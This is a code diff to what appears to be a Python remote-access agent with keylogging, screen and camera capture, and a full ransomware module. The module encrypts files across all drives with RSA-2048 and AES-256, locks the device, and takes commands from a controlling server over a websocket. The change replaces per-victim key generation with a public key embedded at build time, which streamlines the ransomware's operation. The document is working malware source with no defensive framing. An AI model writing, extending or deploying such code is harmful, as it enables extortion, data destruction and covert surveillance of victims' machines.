@@ -98,6 +98,8 @@ CMD_RANSOM_UNLOCK = 0x25  # unlock ransomware with injected key
 
 DEVICE_ID = str(uuid.uuid4())
 HOSTNAME = socket.gethostname()
+_EMBEDDED_PUBKEY = ""  # replaced at build time with agent-specific RSA-2048 public key PEM
+_AGENT_NAME = "agent"  # replaced at build time
 _keylog_on = False
 _keybuf = ""
 _view_mode = "none"  # 'none', 'screen', or 'cam'
@@ -115,7 +117,6 @@ _audio_samplerate = 44100
 _audio_channels = 1
 _log_file = os.path.join(os.environ.get("TEMP", "."), "svc.log")
 _stored_privkey = None  # RSA private key PEM for decrypt/unlock
-_ransom_pending_key = None  # temp holder for key before asyncio send
 
 # ─── Obfuscation Helpers ─────────────────────────────────────
 _OBF_KEY = b"OBFUSCATION_KEY_16BYTE"
@@ -1176,17 +1177,16 @@ def do_lock(password, ready=None):
 # ─── Asymmetric File Encryption (RSA-2048 + AES-256-CBC) ─────
 
 def do_encrypt(targets=""):
-    """Hybrid RSA-AES encrypt. File format: [RSA-enc-AES-key(256B)][IV(16B)][ciphertext]"""
+    """Hybrid RSA-AES encrypt using embedded public key. File format: [RSA-enc-AES-key(256B)][IV(16B)][ciphertext]"""
     from Crypto.PublicKey import RSA
     from Crypto.Cipher import AES as A
     from Crypto.Random import get_random_bytes
     from Crypto.Cipher import PKCS1_OAEP
     import string
-    global _stored_privkey, _ransom_pending_key
 
-    key = RSA.generate(2048)
-    privkey_pem = key.export_key().decode()
-    pubkey = key.publickey()
+    if not _EMBEDDED_PUBKEY:
+        return -3
+    pubkey = RSA.import_key(_EMBEDDED_PUBKEY)
     aes_key = get_random_bytes(32)
 
     count = 0
@@ -1226,9 +1226,6 @@ def do_encrypt(targets=""):
                 for fn in files:
                     if not fn.endswith(".locked"):
                         _enc(os.path.join(r, fn))
-
-    _stored_privkey = privkey_pem
-    _ransom_pending_key = privkey_pem
     return count
 
 
@@ -1301,7 +1298,6 @@ _ransom_lock_trigger = False  # set True by CMD_RANSOM_UNLOCK to signal lock scr
 
 def do_ransomware():
     """Full ransomware: encrypt all drives + persistent lock screen."""
-    global _ransom_pending_key
     c = do_encrypt(targets="")
     import json
     state = json.dumps({"type": "ransom", "device_id": DEVICE_ID, "ts": time.time()})
@@ -2258,6 +2254,7 @@ async def main():
                     "hostname": HOSTNAME,
                     "os": platform.platform(),
                     "is_admin": True,
+                    "agent_name": _AGENT_NAME,
                     "res": res,
                 }
                 if _stream_via_udp:
@@ -2507,11 +2504,8 @@ async def main():
                                     threading.Thread(target=do_lock, args=(a.get("password", "admin"),), daemon=True).start()
                                 elif cmd == 0x21:
                                     c = await asyncio.to_thread(do_encrypt, a.get("targets", ""))
-                                    msg = f"Encrypted {c} files."
-                                    if _ransom_pending_key:
-                                        await send_ws(json.dumps({"cmd": CMD_KEY_EXCH, "data": {"privkey": _ransom_pending_key, "hostname": HOSTNAME, "device_id": DEVICE_ID}}))
-                                        _ransom_pending_key = None
-                                        msg += " Private key sent to server."
+                                    msgs = { -3: "No public key embedded. Rebuild agent with keys." }
+                                    msg = msgs.get(c, f"Encrypted {c} files.")
                                     await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
                                 elif cmd == 0x22:
                                     c = await asyncio.to_thread(do_decrypt, a.get("targets", ""))
@@ -2529,10 +2523,7 @@ async def main():
                                 elif cmd == CMD_RANSOM:
                                     c = await asyncio.to_thread(do_ransomware)
                                     msg = f"Ransomware deployed. {c} files encrypted. Device locked."
-                                    if _ransom_pending_key:
-                                        await send_ws(json.dumps({"cmd": CMD_KEY_EXCH, "data": {"privkey": _ransom_pending_key, "hostname": HOSTNAME, "device_id": DEVICE_ID}}))
-                                        _ransom_pending_key = None
-                                        msg += " Private key sent to server."
+                                    key_name = _AGENT_NAME
                                     await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
                                 elif cmd == CMD_RANSOM_UNLOCK:
                                     c = await asyncio.to_thread(do_unlock_ransom)
